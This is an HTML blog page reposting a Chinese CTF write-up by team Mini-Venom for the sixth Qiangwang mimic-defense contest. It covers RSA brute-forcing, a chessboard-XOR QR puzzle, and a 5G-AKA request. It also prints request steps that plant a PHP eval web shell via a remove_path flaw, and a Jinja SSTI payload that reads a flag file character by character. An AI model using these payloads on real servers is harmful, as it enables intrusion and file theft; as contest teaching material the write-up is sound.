@@ -1,0 +1,223 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>第六届&quot;强网&quot;拟态防御国际精英挑战赛 WriteUp By Mini-Venom | PUDONG LAB</title><meta name="author" content="朴冬,2559874620@qq.com/tyjiang@stu.xjtu.edu.cn"><meta name="copyright" content="朴冬"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="第六届强网拟态防御ChaMd5 Mini-Venom WP,4题:Web(minihttpd remove_path+create&#x2F;zip&#x2F;unzip&#x2F;clear)+Crypto(RSA next_prime近p爆破)+Misc(国际象棋棋盘+二维码XOR)+Mimic(SSTI字符逐位盲注+5G-AKA鉴权)">
+<meta property="og:type" content="article">
+<meta property="og:title" content="第六届&quot;强网&quot;拟态防御国际精英挑战赛 WriteUp By Mini-Venom">
+<meta property="og:url" content="https://pudong617.github.io/2023/01/01/ctf-kb/wp/Web/%E7%AC%AC%E5%85%AD%E5%B1%8A-%E5%BC%BA%E7%BD%91-%E6%8B%9F%E6%80%81%E9%98%B2%E5%BE%A1%E5%9B%BD%E9%99%85%E7%B2%BE%E8%8B%B1%E6%8C%91%E6%88%98%E8%B5%9B_WriteUp_By_Mini-Venom/">
+<meta property="og:site_name" content="PUDONG LAB">
+<meta property="og:description" content="第六届强网拟态防御ChaMd5 Mini-Venom WP,4题:Web(minihttpd remove_path+create&#x2F;zip&#x2F;unzip&#x2F;clear)+Crypto(RSA next_prime近p爆破)+Misc(国际象棋棋盘+二维码XOR)+Mimic(SSTI字符逐位盲注+5G-AKA鉴权)">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pudong617.github.io/img/youli.png">
+<meta property="article:published_time" content="2022-12-31T16:00:00.000Z">
+<meta property="article:modified_time" content="2022-12-31T16:00:00.000Z">
+<meta property="article:author" content="朴冬">
+<meta property="article:tag" content="Web-PHP-remove_path">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pudong617.github.io/img/youli.png"><link rel="shortcut icon" href="/img/PU-LOGO.png"><link rel="canonical" href="https://pudong617.github.io/2023/01/01/ctf-kb/wp/Web/%E7%AC%AC%E5%85%AD%E5%B1%8A-%E5%BC%BA%E7%BD%91-%E6%8B%9F%E6%80%81%E9%98%B2%E5%BE%A1%E5%9B%BD%E9%99%85%E7%B2%BE%E8%8B%B1%E6%8C%91%E6%88%98%E8%B5%9B_WriteUp_By_Mini-Venom/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '第六届"强网"拟态防御国际精英挑战赛 WriteUp By Mini-Venom',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-01-01 00:00:00'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><style>
+  /* 冷色极光渐变背景：与主题主色 #49B1F5 / #00C4B6 同色系 */
+  html #web_bg {
+    background-color: #F5FAFF;
+    background-image:
+      radial-gradient(1200px 700px at 12% -10%, rgba(73, 177, 245, .55), transparent 60%),
+      radial-gradient(1000px 650px at 92% 15%, rgba(0, 196, 182, .40), transparent 60%),
+      radial-gradient(900px 560px at 68% 108%, rgba(255, 114, 66, .16), transparent 62%),
+      linear-gradient(155deg, #E3F2FF 0%, #F6FBFF 45%, #E4F8F2 100%);
+  }
+  /* 暗色模式：同构图，降低光斑强度 */
+  html[data-theme='dark'] #web_bg {
+    background-color: #0B121A;
+    background-image:
+      radial-gradient(1100px 700px at 10% -8%, rgba(73, 177, 245, .45), transparent 62%),
+      radial-gradient(1000px 620px at 92% 12%, rgba(0, 196, 182, .32), transparent 62%),
+      radial-gradient(800px 520px at 72% 105%, rgba(255, 114, 66, .10), transparent 60%),
+      linear-gradient(160deg, #0B121A 0%, #0C1A24 50%, #0A1E20 100%);
+  }
+</style>
+<link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/youli.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">1050</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">879</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">16</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 分享</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> LINK</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background: radial-gradient(1100px 620px at 18% 8%, rgba(73, 177, 245, .55), transparent 60%), radial-gradient(900px 520px at 82% 22%, rgba(0, 196, 182, .45), transparent 62%), radial-gradient(700px 460px at 55% 108%, rgba(255, 114, 66, .18), transparent 60%), linear-gradient(155deg, #0A1A2B 0%, #0E3049 48%, #083F45 100%)"><nav id="nav"><span id="blog-info"><a href="/" title="PUDONG LAB"><img class="site-icon" src="/img/pudong.png"/></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 分享</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> LINK</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">第六届&quot;强网&quot;拟态防御国际精英挑战赛 WriteUp By Mini-Venom</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-12-31T16:00:00.000Z" title="发表于 2023-01-01 00:00:00">2023-01-01</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-12-31T16:00:00.000Z" title="更新于 2023-01-01 00:00:00">2023-01-01</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9F%A5%E8%AF%86%E5%BA%93/">CTF知识库</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9F%A5%E8%AF%86%E5%BA%93/WP/">WP</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9F%A5%E8%AF%86%E5%BA%93/Web/">Web</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="第六届&quot;强网&quot;拟态防御国际精英挑战赛 WriteUp By Mini-Venom"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><blockquote>
+<p>原文: <a target="_blank" rel="noopener" href="https://www.ctfiot.com/146224.html">https://www.ctfiot.com/146224.html</a><br>ID: 146224</p>
+</blockquote>
+<p>招新小广告CTF组诚招re、crypto、pwn、misc、合约方向的师傅,长期招新IOT+Car+工控+样本分析多个组招人有意向的师傅请联系邮箱</p>
+<p><a href="mailto:&#x61;&#x64;&#109;&#105;&#x6e;&#x40;&#x63;&#104;&#97;&#109;&#100;&#x35;&#x2e;&#x6f;&#114;&#103;">&#x61;&#x64;&#109;&#105;&#x6e;&#x40;&#x63;&#104;&#97;&#109;&#100;&#x35;&#x2e;&#x6f;&#114;&#103;</a>(带上简历和想加入的小组</p>
+<p>Web:</p>
+<p>noumisotuitennnoka</p>
+<p>可以看下这个</p>
+<p><a target="_blank" rel="noopener" href="https://blog.tyage.net/archive/p944.html">https://blog.tyage.net/archive/p944.html</a> 利用remove_path的问题</p>
+<p>创建<br>?action&#x3D;create&amp;subdir&#x3D;&#x2F;aa&amp;content&#x3D;&lt;?php eval($_POST[aaa]);&amp;dev&#x3D;&#x2F;tmp&#x2F;&#x2F;<br>压缩<br>?action&#x3D;zip&amp;subdir&#x3D;&#x2F;aa&amp;content&#x3D;&lt;?php eval($_POST[aaa]);&amp;dev&#x3D;&#x2F;tmp&#x2F;&#x2F;<br>解压<br>?action&#x3D;unzip&amp;subdir&#x3D;&#x2F;aa&amp;content&#x3D;&lt;?php eval($_POST[aaa]);&amp;dev&#x3D;&#x2F;tmp&#x2F;&#x2F;<br>删除.htaccess<br>?action&#x3D;clear&amp;subdir&#x3D;&#x2F;.htaccess&amp;content&#x3D;&lt;?php eval($_POST[1]);&amp;dev&#x3D;&#x2F;tmp&#x2F;&#x2F;<br>访问shell</p>
+<p>Crypto:</p>
+<p>一眼看出</p>
+<p>爆破解rsa</p>
+<p>from Crypto.Util.number import *<br>import gmpy2<br>n&#x3D;12102729894834999567967798241264854440333317726097524556907398306153858105<br>8440163574922807151182889153495253964764966037308461724272151584478723275142<br>8580082612577098179633300113762662611197672949490883976713601233211494147009<br>8103551729980712662575804610084066708133243496877086273107369397660406159757<br>5813313<br>c&#x3D;42256117129723577554705402387775886393426604555611637074394963219097781224<br>7760580090035215659441802410321003294567023107373693818900413363120840919958<br>6556040268140377575101285643620793877161117759260042356367121765690839290171<br>3661029126149486651409531213711103407037959788587839729511719756709763927616<br>470267<br>a &#x3D; 11001240791308496565411773845509754352597481464288272699325231395472137144610774645372812149675141360600469640492874223541765389441131365669731006263464699</p>
+<p>for r in range(0,2**6):</p>
+<p>p &#x3D; gmpy2.next_prime(a – r)</p>
+<p>q &#x3D; gmpy2.next_prime(gmpy2.next_prime(a) + r)</p>
+<p>if(p*q&#x3D;&#x3D;n):</p>
+<p>d&#x3D;gmpy2.invert(65537,(p-1)*(q-1))</p>
+<p>m&#x3D;pow(c,d,n)</p>
+<p>print(long_to_bytes(m))</p>
+<p>break</p>
+<p>#flag{621f7c4f-21de-8566-649e-5a883ce318dc}</p>
+<p>Misc:</p>
+<p>国际象棋与二维码</p>
+<p>生成500*500像素，行列为49格的棋盘图案<br>接着与attach.png异或得到二维码<br>扫描得到flag</p>
+<p>Mimic:</p>
+<p>用户登记系统</p>
+<p>url &#x3D; ‘<a target="_blank" rel="noopener" href="http://116.63.134.105/index.php">http://116.63.134.105/index.php</a>‘<br>for i in range(1000):<br>    paylaod &#x3D; {‘name’:’{{c.<strong>init</strong>.<strong>globals</strong>.<strong>builtins</strong>.open(“”.join(c.<strong>init</strong>.<strong>globals</strong>[“<strong>builtins</strong>“].reversed(“galf&#x2F;pmt&#x2F;“))).read()[‘+str(i)+’]}}’}<br>    response &#x3D; requests.post(url,data&#x3D;paylaod).text[8]<br>    print(response,end&#x3D;’’)</p>
+<p>用户鉴权</p>
+<p><a target="_blank" rel="noopener" href="https://www.sharetechnote.com/html/5G/5G_Core_Authentication.html">https://www.sharetechnote.com/html/5G/5G_Core_Authentication.html</a></p>
+<p>POST &#x2F;nudm-ueau&#x2F;v1&#x2F;suci-0-460-00-0-0-0-0123456001&#x2F;security-information&#x2F;generate-auth-data HTTP&#x2F;1.1<br>Host:<br>User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:<br>109.0) Gecko&#x2F;20100101 Firefox&#x2F;119.0<br>Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,<em>&#x2F;</em>;q&#x3D;0.8<br>Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2<br>Accept-Encoding: gzip, deflate<br>Connection: close<br>Upgrade-Insecure-Requests: 1<br>Content-Type: application&#x2F;json</p>
+<p>{</p>
+<p>“servingNetworkName”: “admin”,</p>
+<p>“ausfInstanceId”: “admin”</p>
+<p>}</p>
+<p>然后base64直接解密</p>
+<p>– END –</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">创建</span><br><span class="line">?action=create&amp;subdir=/aa&amp;content=&lt;?php eval($_POST[aaa]);&amp;dev=/tmp//</span><br><span class="line">压缩</span><br><span class="line">?action=zip&amp;subdir=/aa&amp;content=&lt;?php eval($_POST[aaa]);&amp;dev=/tmp//</span><br><span class="line">解压</span><br><span class="line">?action=unzip&amp;subdir=/aa&amp;content=&lt;?php eval($_POST[aaa]);&amp;dev=/tmp//</span><br><span class="line">删除.htaccess</span><br><span class="line">?action=clear&amp;subdir=/.htaccess&amp;content=&lt;?php eval($_POST[1]);&amp;dev=/tmp//</span><br><span class="line">访问shell</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line">import gmpy2</span><br><span class="line">n=12102729894834999567967798241264854440333317726097524556907398306153858105</span><br><span class="line">8440163574922807151182889153495253964764966037308461724272151584478723275142</span><br><span class="line">8580082612577098179633300113762662611197672949490883976713601233211494147009</span><br><span class="line">8103551729980712662575804610084066708133243496877086273107369397660406159757</span><br><span class="line">5813313</span><br><span class="line">c=42256117129723577554705402387775886393426604555611637074394963219097781224</span><br><span class="line">7760580090035215659441802410321003294567023107373693818900413363120840919958</span><br><span class="line">6556040268140377575101285643620793877161117759260042356367121765690839290171</span><br><span class="line">3661029126149486651409531213711103407037959788587839729511719756709763927616</span><br><span class="line">470267</span><br><span class="line">a = 11001240791308496565411773845509754352597481464288272699325231395472137144610774645372812149675141360600469640492874223541765389441131365669731006263464699</span><br><span class="line">生成500*500像素，行列为49格的棋盘图案</span><br><span class="line">接着与attach.png异或得到二维码</span><br><span class="line">扫描得到flag</span><br><span class="line">url = &#x27;http://116.63.134.105/index.php&#x27;</span><br><span class="line">for i in range(1000):</span><br><span class="line">    paylaod = &#123;&#x27;name&#x27;:&#x27;&#123;&#123;c.__init__.__globals__.__builtins__.open(&quot;&quot;.join(c.__init__.__globals__[&quot;__builtins__&quot;].reversed(&quot;galf/pmt/&quot;))).read()[&#x27;+str(i)+&#x27;]&#125;&#125;&#x27;&#125;</span><br><span class="line">    response = requests.post(url,data=paylaod).text[8]</span><br><span class="line">    print(response,end=&#x27;&#x27;)</span><br><span class="line">POST /nudm-ueau/v1/suci-0-460-00-0-0-0-0123456001/security-information/generate-auth-data HTTP/1.1</span><br><span class="line">Host:</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:</span><br><span class="line">109.0) Gecko/20100101 Firefox/119.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/json</span><br></pre></td></tr></table></figure>
+
+
+<hr>
+<h2 id="附图"><a href="#附图" class="headerlink" title="附图"></a>附图</h2><p>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]</p>
+<hr>
+<blockquote>
+<p><strong>转载声明</strong>：本文转载自 <a target="_blank" rel="noopener" href="https://github.com/Dest1ny-Sec/Des-CTF-Knowledge">Des-CTF-Knowledge</a>（MIT License），版权归原作者所有，转载请注明出处；如原作者不希望被转载，请联系删除。<br>原文链接：<a target="_blank" rel="noopener" href="https://www.ctfiot.com/146224.html">https://www.ctfiot.com/146224.html</a><br>仓库原文：<a target="_blank" rel="noopener" href="https://github.com/Dest1ny-Sec/Des-CTF-Knowledge/blob/main/CTF%E5%A4%A7%E8%B5%9BWP%E9%9B%86%E5%90%88/articles/%E7%AC%AC%E5%85%AD%E5%B1%8A%E2%80%9C%E5%BC%BA%E7%BD%91%E2%80%9D%E6%8B%9F%E6%80%81%E9%98%B2%E5%BE%A1%E5%9B%BD%E9%99%85%E7%B2%BE%E8%8B%B1%E6%8C%91%E6%88%98%E8%B5%9B_WriteUp_By_Mini-Venom.full.md">CTF大赛WP集合&#x2F;articles&#x2F;第六届“强网”拟态防御国际精英挑战赛_WriteUp_By_Mini-Venom.full.md</a></p>
+</blockquote>
+</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Web-PHP-remove-path/">Web-PHP-remove_path</a></div><div class="post_share"><div class="social-share" data-image="/img/youli.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/01/01/ctf-kb/wp/Web/%E7%AC%AC%E5%85%AB%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E6%9A%A8-%E7%A3%90%E7%9F%B3%E8%A1%8C%E5%8A%A8-2023-%E9%A6%96%E5%B1%8A-%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E8%B5%9B_%E5%AE%98%E6%96%B9WP/" title="第八届上海市大学生网络安全大赛暨&quot;磐石行动&quot;2023(首届)大学生网络安全邀请赛-漏洞挖掘赛 官方WP"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">第八届上海市大学生网络安全大赛暨&quot;磐石行动&quot;2023(首届)大学生网络安全邀请赛-漏洞挖掘赛 官方WP</div></div></a></div><div class="next-post pull-right"><a href="/2023/01/01/ctf-kb/wp/%E5%8F%96%E8%AF%81/2023_%E5%B9%B4%E5%85%A8%E5%9B%BD%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%A1%8C%E4%B8%9A%E8%81%8C%E4%B8%9A%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B-%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E5%B8%88-%E5%86%B3%E8%B5%9BWP/" title="2023 年全国网络安全行业职业技能大赛 - 电子数据取证分析师 - 决赛 WP"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">2023 年全国网络安全行业职业技能大赛 - 电子数据取证分析师 - 决赛 WP</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/youli.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">朴冬</div><div class="author-info__description">琐碎的学习记录</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">1050</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">879</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">16</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://space.bilibili.com/242470829?spm_id_from=333.1007.0.0"><i class="fab fa-bilibili"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/PUDONGGGGGG" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="/2559874620@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a><a class="social-icon" href="https://space.bilibili.com/242470829?spm_id_from=333.1007.0.0" target="_blank" title="Bilibili"><i class="fab fa-bilibili" style="color: #1797cf;"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%99%84%E5%9B%BE"><span class="toc-number">1.</span> <span class="toc-text">附图</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/30/ctf-kb/%E5%B7%A5%E5%85%B7/Dirsearch/" title="Dirsearch">Dirsearch</a><time datetime="2026-05-29T16:00:00.000Z" title="发表于 2026-05-30 00:00:00">2026-05-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/30/ctf-kb/%E5%B7%A5%E5%85%B7/SCRIPTS-INDEX/" title="CTF 常用脚本索引">CTF 常用脚本索引</a><time datetime="2026-05-29T16:00:00.000Z" title="发表于 2026-05-30 00:00:00">2026-05-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/30/ctf-kb/%E5%B7%A5%E5%85%B7/ffuf%E7%9A%84%E4%BD%BF%E7%94%A8/" title="ffuf的使用">ffuf的使用</a><time datetime="2026-05-29T16:00:00.000Z" title="发表于 2026-05-30 00:00:00">2026-05-30</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 - 2026 By 朴冬</div><div class="footer_custom_text">Welcome</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat-btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="/js/tw_cn.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i 